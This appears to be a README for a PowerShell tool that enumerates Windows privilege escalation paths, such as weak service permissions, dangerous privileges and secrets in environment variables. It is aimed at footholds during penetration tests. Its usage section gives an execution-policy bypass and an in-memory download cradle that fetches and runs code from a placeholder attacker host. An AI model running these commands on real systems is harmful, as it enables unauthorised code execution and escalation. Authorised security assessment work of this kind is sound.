WinPrivEsc-Triage is a lightweight, standalone PowerShell script designed to rapidly enumerate Windows systems for common privilege escalation vectors and situational awareness.

It is built to be "Living off the Land" compliant. it requires no external modules, binaries, or dependencies, making it ideal for restricted environments or initial footholds.
___
# 🚀 Features
### 1. Situational Awareness
- System Details: Grabs Hostname, OS Version/Build, Architecture, Domain status, and Last Boot time.
- Secret Hunting: Scans Environment Variables for keywords like AWS, API, KEY, PASSWORD, TOKEN, AZURE, etc.
### 2. User & Privilege Analysis
- Dangerous Privileges: specific checks for high-risk privileges (e.g., SeImpersonate, SeDebug, SeBackup, SeLoadDriver).
- Group Enumeration: Identifies membership in high-value groups (Administrators, Hyper-V, DnsAdmins, Print/Backup/Server Operators).
- Safe SID Translation: Includes error handling to translate SIDs to names even if the Domain Controller is unreachable (prevents script crashes).
- Registry Checks: Checks for AlwaysInstallElevated (HKCU/HKLM) vulnerability.
### 3. Service Audit
- Unquoted Service Paths: Detects services with spaces in the path that lack quotes.
- Weak Binary Permissions: Checks if the current user (or "Everyone"/"Users") has Write/Modify access to service executables.
- Weak Directory Permissions: (New) Checks if the directory containing the service binary is writable, allowing for DLL hijacking or binary replacement.
- Noise Reduction: Automatically filters out standard Windows binaries (System32, svchost) to focus on third-party software.
___
# 📥 Installation & Usage
### Method 1: Direct Execution
- Clone the repository or copy the script content to the target machine.
```
# Allow script execution if restricted
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Run the script
.\WinPrivEsc-Triage.ps1
```
### Method 2: In-Memory (Download Cradle)
- If you cannot drop files to disk, you can load it directly into memory (hosted on your own attacking machine or GitHub raw).
```
IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/WinPrivEsc-Triage.ps1')
```
___
_**will add some more features, toodles for now**_
